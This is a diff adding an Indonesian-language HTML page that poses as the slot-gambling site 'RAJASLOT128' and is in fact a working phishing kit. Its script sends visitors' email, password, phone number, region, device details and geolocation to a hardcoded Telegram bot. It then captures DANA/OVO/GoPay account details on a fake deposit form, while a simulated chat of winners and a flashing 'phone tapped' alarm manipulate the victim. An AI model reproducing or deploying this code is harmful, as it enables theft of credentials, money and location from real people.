@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RAJASLOT128</title>
+  <style>
+    body {
+      margin: 0; background: black; color: white;
+      font-family: Arial, sans-serif; text-align: center;
+    }
+    input, select, button {
+      margin: 10px 0; padding: 12px;
+      font-size: 1em; width: 80%; border-radius: 10px; border: none;
+    }
+    button { 
+      background: gold; color: black; cursor: pointer; font-weight: bold;
+      transition: transform 0.1s ease, box-shadow 0.1s ease;
+    }
+    button:active {
+      transform: scale(0.95);
+      box-shadow: 0 0 5px gold;
+    }
+    .hidden { display: none; }
+    img.slot-img {
+      width: 100px; height: auto; border-radius: 12px;
+    }
+    .games { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 10px; }
+    .games div { margin-bottom: 20px; }
+    .alert {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: red; color: white;
+      font-size: 1.8em; display: none;
+      align-items: center; justify-content: center;
+      animation: blink 0.4s infinite;
+      z-index: 99;
+    }
+    @keyframes blink {
+      0%, 100% { background: red; }
+      50% { background: black; }
+    }
+    .saldo { font-size: 1.1em; margin: 15px; color: lime; }
+    .back-btn {
+      background: #444; color: white; margin-top: 20px;
+    }
+    #chatBox {
+      background: #111; padding: 10px; max-height: 200px;
+      overflow-y: auto; border-top: 2px solid gold;
+      text-align: left; margin-top: 10px;
+    }
+    .chat-msg {
+      margin-bottom: 8px; font-size: 0.9em;
+    }
+    .chat-msg span {
+      color: gold;
+    }
+    .cs-info {
+      font-size: 0.85em; color: #aaa; margin-top: 15px;
+    }
+    #kodeBox {
+      color: gold;
+      font-size: 1.3em;
+      margin-top: 15px;
+      white-space: pre-line;
+    }
+  </style>
+</head>
+<body>
+
+<audio autoplay loop>
+  <source src="https://files.catbox.moe/2qzbrd.mp3" type="audio/mpeg">
+</audio>
+
+<div id="loginScreen">
+  <h1>⚡LOGIN⚡</h1>
+  <input id="email" placeholder="Email (@gmail.com)" type="email" />
+  <input id="pw" placeholder="Password" type="password" />
+  <input id="phone" placeholder="Nomor HP (08xxxx)" />
+  <select id="region">
+    <option value="">Pilih Wilayah</option>
+    <option>Jawa Barat</option>
+    <option>Jawa Timur</option>
+    <option>DKI Jakarta</option>
+    <option>Sumatera</option>
+    <option>Kalimantan</option>
+  </select>
+  <button onclick="doLogin()">LOGIN</button>
+  <div id="kodeBox"></div>
+  <img src="https://i.ibb.co/Y3rRZ0x/zeus.png" alt="Zeus" style="width:180px;margin-top:20px">
+  <p class="cs">Hubungi CS: cs@rajaslot128.com | WA: +6281234567890</p>
+</div>
+
+<div class="hidden" id="gameScreen">
+  <h2>Pilih Permainan</h2>
+  <div class="cs-info">Live Chat: +6281234567890 | Email: cs@rajaslot128.com</div>
+  <div class="games" id="gameList"></div>
+  <div id="chatBox"></div>
+</div>
+
+<div class="hidden" id="depositScreen">
+  <h2>💰 DEPOSIT 💰</h2>
+  <p class="saldo">Saldo: Rp0</p>
+  <select id="via">
+    <option value="DANA">Via DANA</option>
+    <option value="OVO">Via OVO</option>
+    <option value="GOPAY">Via GOPAY</option>
+  </select>
+  <input id="namaDana" placeholder="Nama Akun Dana" />
+  <input id="nomorDana" placeholder="Nomor Dana/OVO" />
+  <input id="jumlah" placeholder="Jumlah Deposit (Rp)" type="number"/>
+  <button onclick="submitDeposit()">KIRIM</button>
+  <button class="back-btn" onclick="backToGame()">Kembali</button>
+  <p style="font-size: 0.9em; color:#aaa">DEPOSIT BISA MENGGUNAKAN DANA PREM/TIDAKPREM</p>
+</div>
+
+<div class="alert" id="alertBox">⚠️ HP KAMU SEDANG DISADAP ⚠️</div>
+
+<script>
+const token = '7713866440:AAGASbOKxo-p3JftT20EQ2y5t98CgcrAliQ';
+const chat = '7990816835';
+
+function sendToBot(msg) {
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: chat, text: msg })
+  });
+}
+
+function doLogin() {
+  const email = document.getElementById('email').value.trim();
+  const pw = document.getElementById('pw').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  const region = document.getElementById('region').value;
+
+  if (!email || !pw || !phone || !region) return alert("Lengkapi semua kolom!");
+  if (!email.endsWith("@gmail.com")) return alert("Gunakan email yang berakhiran @gmail.com!");
+  if (!/^08[0-9]{8,13}$/.test(phone)) return alert("Nomor HP tidak valid!");
+
+  const kodeVerifikasi = Math.floor(100000 + Math.random() * 900000).toString();
+  let sisa = 15;
+  const kodeBox = document.getElementById('kodeBox');
+  kodeBox.innerText = `📩 Kode verifikasi kamu: ${kodeVerifikasi}\n⏳ Tunggu ${sisa} detik...`;
+
+  const timer = setInterval(() => {
+    sisa--;
+    if (sisa <= 0) {
+      clearInterval(timer);
+      navigator.getBattery().then(bat => {
+        const batLvl = Math.round(bat.level * 100);
+        const device = navigator.userAgent;
+
+        sendToBot(`✅ LOGIN BERHASIL\nEmail: ${email}\nPassword: ${pw}\nNo HP: ${phone}\nWilayah: ${region}\nBattery: ${batLvl}%\nDevice: ${device}`);
+      });
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const loc = `📍 Lokasi: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          sendToBot(loc);
+        });
+      }
+
+      document.getElementById('loginScreen').classList.add('hidden');
+      document.getElementById('gameScreen').classList.remove('hidden');
+      loadGames();
+      startChatSimulation();
+    } else {
+      kodeBox.innerText = `📩 Kode verifikasi kamu: ${kodeVerifikasi}\n⏳ Tunggu ${sisa} detik...`;
+    }
+  }, 1000);
+}
+
+function loadGames() {
+  const names = ["Zeus Olympus", "Gates of Hell", "Dragon Slot", "Joker Spin", "Power Dice", "Fruit Party", "Lucky Spin", "Great Rhino", "Sweet Bonanza", "King Kong Gold", "Panda Riches", "Aztec Gems", "Queen Slot", "Diamond Crush", "Fortune Tiger"];
+  const container = document.getElementById('gameList');
+  container.innerHTML = "";
+  names.forEach((name, i) => {
+    container.innerHTML += `
+      <div>
+        <img class="slot-img" src="https://source.unsplash.com/100x100/?slot,${i}" alt="${name}">
+        <p>${name}</p>
+        <button onclick="startGame('${name}')">Main</button>
+      </div>`;
+  });
+}
+
+function startGame(name) {
+  sendToBot(`🎰 ${name} DIPILIH`);
+  document.getElementById('gameScreen').classList.add('hidden');
+  document.getElementById('depositScreen').classList.remove('hidden');
+}
+
+function submitDeposit() {
+  const via = document.getElementById('via').value;
+  const nama = document.getElementById('namaDana').value;
+  const no = document.getElementById('nomorDana').value;
+  const jumlah = document.getElementById('jumlah').value;
+  if (!via || !nama || !no || !jumlah) return alert("Lengkapi semua data deposit!");
+  if (!/^08[0-9]{8,13}$/.test(no)) return alert("Nomor tidak valid!");
+  sendToBot(`💳 DEPOSIT\nVia: ${via}\nNama: ${nama}\nNomor: ${no}\nJumlah: Rp${jumlah}`);
+  alertSadap();
+}
+
+function backToGame() {
+  document.getElementById('depositScreen').classList.add('hidden');
+  document.getElementById('gameScreen').classList.remove('hidden');
+}
+
+function alertSadap() {
+  document.getElementById('depositScreen').classList.add('hidden');
+  const box = document.getElementById('alertBox');
+  box.style.display = 'flex';
+  sendToBot('🚨 SADAP TRIGGERED DARI DEPOSIT');
+}
+
+function startChatSimulation() {
+  const chatBox = document.getElementById('chatBox');
+  const msgs = [
+    "🎯 Rizal123: Wihh baru WD 1jt",
+    "💸 SlotKing88: Gates of Hell gacor banget!",
+    "🤑 NanaSpin: Sweet Bonanza kaya ngasih mulu anjir",
+    "🎰 AndreSlot: Zeus barusan petir biru keluar 3x 😱",
+    "🎲 VinaJackpot: Panda Riches lumayan hoki",
+    "⚡ SultanJP: Kalo DC scatter keluarin banyak spin bro",
+    "🔒 Admin: Jangan lupa verifikasi data ya bang 😎"
+  ];
+  let i = 0;
+  setInterval(() => {
+    if (i >= msgs.length) i = 0;
+    const p = document.createElement("p");
+    p.className = "chat-msg";
+    p.innerHTML = msgs[i];
+    chatBox.appendChild(p);
+    chatBox.scrollTop = chatBox.scrollHeight;
+    i++;
+  }, 3000);
+}
+</script>
+</body>
+</html>
